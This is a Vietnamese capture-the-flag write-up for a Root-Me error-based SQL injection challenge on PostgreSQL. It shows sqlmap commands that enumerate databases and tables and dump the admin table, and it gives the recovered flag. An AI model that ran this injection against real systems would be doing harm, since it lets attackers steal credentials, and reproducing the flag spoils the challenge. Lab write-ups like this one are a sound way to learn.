# SQL-Error

**Point: 40**

**Exploiting SQL error**

**Statement: Retrieve administrator’s password.**

**Related ressources:**

[Khai thác Error based SQL injection](https://whitehat.vn/threads/sql-injection-khai-thac-error-based-sql-injection.5664/)

[Error Based Injection](https://sqlwiki.netspi.com/injectionTypes/errorBased/#postgresql)

[SQL Payload List](https://github.com/payloadbox/sql-injection-payload-list)

[Information schema](https://www.postgresql.org/docs/9.1/information-schema.html#:~:text=The%20information%20schema%20consists%20of,defined%20in%20the%20current%20database.&text=Some%20other%20views%20have%20similar,%2C%20constraint_column_usage%2C%20constraint_table_usage%2C%20table_constraints)

# Overview:

![image](https://user-images.githubusercontent.com/115911041/234256771-e502129c-1539-482d-b6e4-db8d0932b92a.png)

Form của challenge. Lần này challenge cung cấp cho ta 2 mục `Authentication` và `Contents`. Ban đầu thấy mục `Authentication` có chức năng Login, mình đã thử fuzz nhưng kết quả cho ra là `login failed`. Mình chuyển sang mục `Contents`

![image](https://user-images.githubusercontent.com/115911041/234257979-f60dad57-c246-40dc-9e5a-94aa89169ae0.png)

Nhận thấy URL có thay đổi. Thấy xuất hiện `order` và `ASC`, nghĩa là ở đây đang sử dụng lệnh `order by` và `ASC` là sắp sếp theo thứ tự tăng dần. Mình sẽ thử fuzz 

Ban đầu là thêm dấu nháy `'` thì có lỗi báo giống như dự đoán là  đang sử dụng `order by` theo cột page và `ERROR: syntax error at or near "''"` nghĩa là database đang chạy là PostgreSQL.

Vậy đối với challenge này ta dùng Error-Based Blind SQL Injection. Phương thức này là cơ bản là một phương thức mà câu truy vấn của mình sẽ khiến server trả về thông báo lỗi, từ thông báo lỗi đó có thể chứa nội dung truy vấn hoặc các thông tin của cơ sở dữ liệu để chúng ta có thể khai thác xa hơn.

Đối với PostgreSQL thì chỉ có 1 lỗi ta có thể khai thác SQL injection - đổi kiểu dữ liệu từ dạng chuỗi sang dạng số. Ta có 2 hàm sử dụng là `Cast()` và `Convert`
đối với PostgreSQL thì ta sử dụng `Cast()`

Một cách khác nữa là ta sử dụng SQL map

# Solution:

# 1ST

Sử dụng câu lệnh sau

`python sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" --dbs` 

![image](https://user-images.githubusercontent.com/115911041/234262375-2723de88-19fb-49fc-a8b6-a86762c871dd.png)

Kết quả trả về cho ta thấy bài này xuất hiện 2 cách khai thác sqli bao gồm khai khác blind và error. Có 3 database trả về, tuy nhiên ta chỉ cần chú ý đến database public là được. Thực hiện lấy các tables trên database này

`python sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" -D public --tables`

`-D public` là lấy kết quả trong `database public` còn `--tables` sử dụng để lấy tên các bảng.

![image](https://user-images.githubusercontent.com/115911041/234263135-d1a7ceb6-2218-4a4e-95de-126a678f2f07.png)


Kết quả cho ra table là  `m3mbr35t4bl3`. Thực hiện lấy data trong table

`python sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" -D public -T m3mbr35t4bl3 --dump`

`-T` là bảng cần lấy data, `--dump` lầy toàn bộ dữ liệu.

![image](https://user-images.githubusercontent.com/115911041/234263711-6ac5cf8d-5db7-4525-a3ed-1784cb72e91b.png)

Kết quả cho ra 1 hàng dữ liệu của admin `Flag: 1a2BdKT5DIx3qxQN3UaC`

